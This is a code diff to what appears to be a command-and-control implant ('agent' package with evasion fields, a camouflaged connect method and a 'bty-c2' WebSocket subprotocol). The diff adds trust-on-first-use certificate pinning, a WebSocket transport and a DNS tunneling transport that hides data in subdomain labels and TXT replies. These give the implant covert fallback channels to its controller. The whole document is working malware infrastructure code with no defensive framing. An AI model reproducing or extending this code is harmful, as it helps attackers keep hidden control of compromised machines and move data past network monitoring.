@@ -3,6 +3,7 @@ package agent
 import (
 	"crypto/hmac"
 	"crypto/rand"
+	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
@@ -61,6 +62,9 @@ type Agent struct {
 	evasive    bool
 	jitterBase time.Duration
 	sleepMask  *evasion.SleepMask
+
+	// Certificate pinning
+	certPinner *CertPinner
 
 	// Channels
 	tasks   chan *proto.Task
@@ -195,7 +199,7 @@ func (a *Agent) connect() error {
 		port = "8443"
 	}
 
-	// Transport fallback: TLS → Plain TCP → HTTP → WebSocket
+	// Transport fallback: TLS (cert-pinned) → TCP → HTTP → WebSocket → DNS
 	transports := []struct {
 		name string
 		dial func() (net.Conn, error)
@@ -203,13 +207,41 @@ func (a *Agent) connect() error {
 		{
 			name: "TLS",
 			dial: func() (net.Conn, error) {
+				// Use certificate pinning if available
+				if a.certPinner != nil {
+					conn, err := a.certPinner.DialTLS(net.JoinHostPort(host, port))
+					if err == nil {
+						// Store fingerprint on first successful connection
+						state := conn.(*tls.Conn).ConnectionState()
+						if len(state.PeerCertificates) > 0 {
+							fp := GetFingerprintFromCert(state.PeerCertificates[0])
+							if a.certPinner.pinnedFingerprint == "" {
+								a.certPinner.pinnedFingerprint = fp
+								log.Printf("[AGENT] Pinned server certificate: %s", fp[:16]+"...")
+							}
+						}
+					}
+					return conn, err
+				}
+
+				// First connection: accept any cert but prepare to pin
 				tlsConfig := &tls.Config{
 					InsecureSkipVerify: true,
 					MinVersion:         tls.VersionTLS12,
 					ServerName:         host,
 				}
 				dialer := &net.Dialer{Timeout: 10 * time.Second}
-				return tls.DialWithDialer(dialer, "tcp", net.JoinHostPort(host, port), tlsConfig)
+				conn, err := tls.DialWithDialer(dialer, "tcp", net.JoinHostPort(host, port), tlsConfig)
+				if err == nil {
+					// Extract and pin the certificate fingerprint
+					state := conn.ConnectionState()
+					if len(state.PeerCertificates) > 0 {
+						fp := GetFingerprintFromCert(state.PeerCertificates[0])
+						a.certPinner = NewCertPinner(fp, host)
+						log.Printf("[AGENT] Pinned server certificate on first connect: %s", fp[:16]+"...")
+					}
+				}
+				return conn, err
 			},
 		},
 		{
@@ -222,12 +254,14 @@ func (a *Agent) connect() error {
 			name: "HTTP",
 			dial: func() (net.Conn, error) {
 				httpPort := "8445"
-				if p, err := func() (string, error) {
-					return httpPort, nil
-				}(); err == nil {
-					_ = p
-				}
 				return net.DialTimeout("tcp", net.JoinHostPort(host, httpPort), 10*time.Second)
+			},
+		},
+		{
+			name: "WebSocket",
+			dial: func() (net.Conn, error) {
+				wsPort := "8446"
+				return dialWebSocket(host, wsPort)
 			},
 		},
 	}
@@ -266,6 +300,355 @@ func (a *Agent) ConnectCamouflaged() error {
 	log.Printf("[AGENT] Connected via camouflaged TLS to %s", a.serverAddr)
 	a.conn = conn
 	return nil
+}
+
+// --- WebSocket Transport ---
+
+// wsConn wraps an HTTP connection with WebSocket framing.
+type wsConn struct {
+	conn   net.Conn
+	reader *wsFrameReader
+	writer *wsFrameWriter
+}
+
+type wsFrameReader struct {
+	conn   net.Conn
+	buf    []byte
+	offset int
+	length int
+}
+
+type wsFrameWriter struct {
+	conn net.Conn
+}
+
+func (r *wsFrameReader) Read(b []byte) (int, error) {
+	for r.offset >= r.length {
+		// Read frame header (2 bytes minimum)
+		header := make([]byte, 2)
+		if _, err := r.conn.Read(header); err != nil {
+			return 0, err
+		}
+
+		// Check for close frame
+		opcode := header[0] & 0x0F
+		if opcode == 0x08 {
+			return 0, fmt.Errorf("websocket closed")
+		}
+
+		masked := (header[1] & 0x80) != 0
+		payloadLen := int(header[1] & 0x7F)
+
+		if payloadLen == 126 {
+			ext := make([]byte, 2)
+			r.conn.Read(ext)
+			payloadLen = int(ext[0])<<8 | int(ext[1])
+		} else if payloadLen == 127 {
+			ext := make([]byte, 8)
+			r.conn.Read(ext)
+			payloadLen = int(ext[4])<<24 | int(ext[5])<<16 | int(ext[6])<<8 | int(ext[7])
+		}
+
+		// Read mask key if present
+		var maskKey [4]byte
+		if masked {
+			r.conn.Read(maskKey[:])
+		}
+
+		// Read payload
+		r.buf = make([]byte, payloadLen)
+		r.conn.Read(r.buf)
+
+		// Unmask if needed
+		if masked {
+			for i := 0; i < len(r.buf); i++ {
+				r.buf[i] ^= maskKey[i%4]
+			}
+		}
+
+		r.offset = 0
+		r.length = len(r.buf)
+	}
+
+	n := copy(b, r.buf[r.offset:r.length])
+	r.offset += n
+	return n, nil
+}
+
+func (w *wsFrameWriter) Write(b []byte) (int, error) {
+	// WebSocket frame: FIN=1, opcode=2 (binary), no mask
+	frame := make([]byte, 0, 14+len(b))
+	frame = append(frame, 0x82) // FIN + binary opcode
+
+	if len(b) < 126 {
+		frame = append(frame, byte(len(b)))
+	} else if len(b) < 65536 {
+		frame = append(frame, 126, byte(len(b)>>8), byte(len(b)))
+	} else {
+		frame = append(frame, 127)
+		for i := 7; i >= 0; i-- {
+			frame = append(frame, byte(len(b)>>(i*8)))
+		}
+	}
+
+	frame = append(frame, b...)
+	return w.conn.Write(frame)
+}
+
+func (c *wsConn) Read(b []byte) (int, error)  { return c.reader.Read(b) }
+func (c *wsConn) Write(b []byte) (int, error) { return c.writer.Write(b) }
+func (c *wsConn) Close() error                { return c.conn.Close() }
+func (c *wsConn) LocalAddr() net.Addr         { return c.conn.LocalAddr() }
+func (c *wsConn) RemoteAddr() net.Addr        { return c.conn.RemoteAddr() }
+func (c *wsConn) SetDeadline(t time.Time) error {
+	return c.conn.SetDeadline(t)
+}
+func (c *wsConn) SetReadDeadline(t time.Time) error {
+	return c.conn.SetReadDeadline(t)
+}
+func (c *wsConn) SetWriteDeadline(t time.Time) error {
+	return c.conn.SetWriteDeadline(t)
+}
+
+// dialWebSocket establishes a WebSocket connection to the server.
+func dialWebSocket(host, port string) (net.Conn, error) {
+	addr := net.JoinHostPort(host, port)
+	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", addr, &tls.Config{
+		InsecureSkipVerify: true,
+		MinVersion:         tls.VersionTLS12,
+		ServerName:         host,
+	})
+	if err != nil {
+		return nil, err
+	}
+
+	// Send WebSocket upgrade request
+	key := make([]byte, 16)
+	rand.Read(key)
+	keyBase64 := base64.StdEncoding.EncodeToString(key)
+
+	upgradeReq := fmt.Sprintf(
+		"GET /ws HTTP/1.1\r\n"+
+			"Host: %s\r\n"+
+			"Upgrade: websocket\r\n"+
+			"Connection: Upgrade\r\n"+
+			"Sec-WebSocket-Key: %s\r\n"+
+			"Sec-WebSocket-Version: 13\r\n"+
+			"Sec-WebSocket-Protocol: bty-c2\r\n\r\n",
+		addr, keyBase64)
+
+	if _, err := conn.Write([]byte(upgradeReq)); err != nil {
+		conn.Close()
+		return nil, err
+	}
+
+	// Read response
+	buf := make([]byte, 1024)
+	n, err := conn.Read(buf)
+	if err != nil {
+		conn.Close()
+		return nil, err
+	}
+
+	resp := string(buf[:n])
+	if !strings.Contains(resp, "101 Switching Protocols") {
+		conn.Close()
+		return nil, fmt.Errorf("websocket upgrade failed: %s", resp[:minInt(len(resp), 100)])
+	}
+
+	return &wsConn{
+		conn:   conn,
+		reader: &wsFrameReader{conn: conn},
+		writer: &wsFrameWriter{conn: conn},
+	}, nil
+}
+
+// --- DNS Transport ---
+
+// dnsConn implements net.Conn for DNS tunneling.
+type dnsConn struct {
+	conn     *net.UDPConn
+	server   *net.UDPAddr
+	domain   string
+	sessionID string
+	upBuf    []byte
+	downBuf  []byte
+	upOff    int
+	downOff  int
+}
+
+func (c *dnsConn) Read(b []byte) (int, error) {
+	// Read from down buffer first
+	if c.downOff < len(c.downBuf) {
+		n := copy(b, c.downBuf[c.downOff:])
+		c.downOff += n
+		return n, nil
+	}
+
+	// Send query with empty data to get response
+	query := buildDNSQuery(c.sessionID, c.domain, []byte{})
+	if _, err := c.conn.WriteToUDP(query, c.server); err != nil {
+		return 0, err
+	}
+
+	// Read response
+	resp := make([]byte, 512)
+	n, _, err := c.conn.ReadFromUDP(resp)
+	if err != nil {
+		return 0, err
+	}
+
+	// Extract TXT record data
+	data := extractDNSTXTData(resp[:n])
+	c.downBuf = data
+	c.downOff = 0
+
+	if len(data) == 0 {
+		return 0, fmt.Errorf("dns read timeout")
+	}
+
+	m := copy(b, data)
+	c.downOff = m
+	return m, nil
+}
+
+func (c *dnsConn) Write(b []byte) (int, error) {
+	query := buildDNSQuery(c.sessionID, c.domain, b)
+	return c.conn.WriteToUDP(query, c.server)
+}
+
+func (c *dnsConn) Close() error { return c.conn.Close() }
+func (c *dnsConn) LocalAddr() net.Addr {
+	return &net.UDPAddr{IP: net.IPv4zero, Port: 0}
+}
+func (c *dnsConn) RemoteAddr() net.Addr { return c.server }
+func (c *dnsConn) SetDeadline(t time.Time) error {
+	return c.conn.SetDeadline(t)
+}
+func (c *dnsConn) SetReadDeadline(t time.Time) error {
+	return c.conn.SetReadDeadline(t)
+}
+func (c *dnsConn) SetWriteDeadline(t time.Time) error {
+	return c.conn.SetWriteDeadline(t)
+}
+
+// dialDNS establishes a DNS tunnel connection.
+func dialDNS(serverAddr, domain string) (net.Conn, error) {
+	server, err := net.ResolveUDPAddr("udp", serverAddr)
+	if err != nil {
+		return nil, err
+	}
+
+	conn, err := net.DialUDP("udp", nil, server)
+	if err != nil {
+		return nil, err
+	}
+
+	sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(time.Now().String())))[:16]
+
+	return &dnsConn{
+		conn:      conn,
+		server:    server,
+		domain:    domain,
+		sessionID: sessionID,
+	}, nil
+}
+
+func buildDNSQuery(sessionID, domain string, data []byte) []byte {
+	// Encode data as base64 subdomain labels
+	encoded := base64.URLEncoding.EncodeToString(data)
+	encoded = strings.ReplaceAll(encoded, "=", "")
+
+	// Build query name: session.data.domain.
+	qname := fmt.Sprintf("%s.%s.%s.", sessionID[:8], encoded[:minInt(len(encoded), 50)], domain)
+
+	// Build DNS query header
+	buf := make([]byte, 0, 64+len(qname))
+	buf = append(buf, 0x00, 0x01) // Transaction ID
+	buf = append(buf, 0x01, 0x00) // Flags: standard query
+	buf = append(buf, 0x00, 0x01) // Questions: 1
+	buf = append(buf, 0x00, 0x00) // Answer RRs: 0
+	buf = append(buf, 0x00, 0x00) // Authority RRs: 0
+	buf = append(buf, 0x00, 0x00) // Additional RRs: 0
+
+	// Encode question name
+	for _, label := range strings.Split(qname, ".") {
+		if label == "" {
+			continue
+		}
+		buf = append(buf, byte(len(label)))
+		buf = append(buf, label...)
+	}
+	buf = append(buf, 0x00) // End of name
+
+	// QTYPE: TXT (16), QCLASS: IN (1)
+	buf = append(buf, 0x00, 0x10)
+	buf = append(buf, 0x00, 0x01)
+
+	return buf
+}
+
+func extractDNSTXTData(resp []byte) []byte {
+	if len(resp) < 12 {
+		return nil
+	}
+
+	// Skip header + question
+	offset := 12
+	for offset < len(resp) {
+		if resp[offset] == 0 {
+			offset++
+			break
+		}
+		offset += int(resp[offset]) + 1
+	}
+	offset += 4 // QTYPE + QCLASS
+
+	// Skip to answer section
+	ansCount := int(resp[6])<<8 | int(resp[7])
+	if ansCount == 0 {
+		return nil
+	}
+
+	// Parse first answer (TXT record)
+	for offset < len(resp)-10 {
+		// Skip name
+		if resp[offset] == 0 {
+			offset++
+		} else if resp[offset]&0xC0 == 0xC0 {
+			offset += 2
+		} else {
+			offset += int(resp[offset]) + 1
+		}
+
+		if offset+10 > len(resp) {
+			break
+		}
+
+		rtype := int(resp[offset])<<8 | int(resp[offset+1])
+		rdlength := int(resp[offset+8])<<8 | int(resp[offset+9])
+
+		if rtype == 16 && offset+10+rdlength <= len(resp) { // TXT
+			// TXT data starts at offset+10
+			txtData := resp[offset+10 : offset+10+rdlength]
+			// Skip length byte(s)
+			if len(txtData) > 0 {
+				return txtData[1:]
+			}
+			return txtData
+		}
+
+		offset += 10 + rdlength
+	}
+
+	return nil
+}
+
+func minInt(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
 }
 
 func (a *Agent) performKeyExchange() error {
